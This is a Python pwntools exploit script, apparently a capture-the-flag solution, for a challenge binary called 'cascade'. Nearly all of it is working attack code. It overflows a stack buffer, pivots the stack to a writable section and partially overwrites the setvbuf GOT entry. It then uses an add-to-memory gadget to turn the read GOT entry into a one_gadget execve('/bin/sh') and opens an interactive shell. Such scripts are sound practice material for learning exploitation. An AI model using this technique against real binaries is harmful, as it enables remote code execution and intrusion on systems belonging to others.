#!/usr/bin/env python3
from hakai import *
from pwn import *

exe = ELF('./vuln_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
context.binary = exe

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b* vuln+36
        c
        ''')
        input()


if args.REMOTE:
    p = remote('cascade.chal.imaginaryctf.org',  1337)
    rl(p)
else:
    p = process([exe.path])

'''
overwrite setvbuf   
   0x15555538acf8 <fputwc_unlocked+72>: pop    rbx
   0x15555538acf9 <fputwc_unlocked+73>: pop    r12
   0x15555538acfb <fputwc_unlocked+75>: pop    rbp
   0x15555538acfc <fputwc_unlocked+76>: ret
'''
'''
   0x0000000000401162 <+12>:    lea    rax,[rbp-0x40]
   0x0000000000401166 <+16>:    mov    edx,0x200
   0x000000000040116b <+21>:    mov    rsi,rax
   0x000000000040116e <+24>:    mov    edi,0x0
   0x0000000000401173 <+29>:    call   0x401050 <read@plt>
   0x0000000000401178 <+34>:    nop
'''

padding_rbp = 0x40         #rax, [rbp - 0x40]
wr_section = 0x404e00      #address_read_write
magic_gadget = 0x40113c    #add dword ptr[rbp - 0x3d], ebx, nop, ret
read_vuln = 0x401162       #return read again
leave_ret = 0x401179       
pop_rbp = 0x40113d
offset_real = 0xfffd3a7e
ret_main = 0x40117b
payload = flat(b'\x00'*64, exe.got.setvbuf + padding_rbp*2, read_vuln)
sleep(1)
s(p, payload)
payload = flat(wr_section, read_vuln, b'\x00'*(64 - 16), exe.got.setvbuf + padding_rbp, read_vuln)
sleep(1)
s(p, payload)
sleep(1)
s(p, p16(0xacf8))
'''
0xef4ce execve("/bin/sh", rbp-0x50, r12)
constraints:
  address rbp-0x48 is writable
  rbx == NULL || {"/bin/sh", rbx, NULL} is a valid argv
  [r12] == NULL || r12 == NULL || r12 is a valid envp
'''
# 0x404dc0
GDB()
payload = flat(exe.plt.setvbuf, offset_real, 0, exe.got.read + 0x3d, magic_gadget, exe.plt.setvbuf, 0, 0, wr_section, pop_rbp, wr_section+padding_rbp, read_vuln)
sleep(1)
s(p, payload)
## wrsection - padding_rbp - 8 = 0x404db8

payload = flat(wr_section, magic_gadget, exe.plt.read, pop_rbp, wr_section - padding_rbp - 8, leave_ret, b'A'*(64-16*3), wr_section + 0x40 - 8, leave_ret)
sleep(1)
s(p, payload)
p.interactive()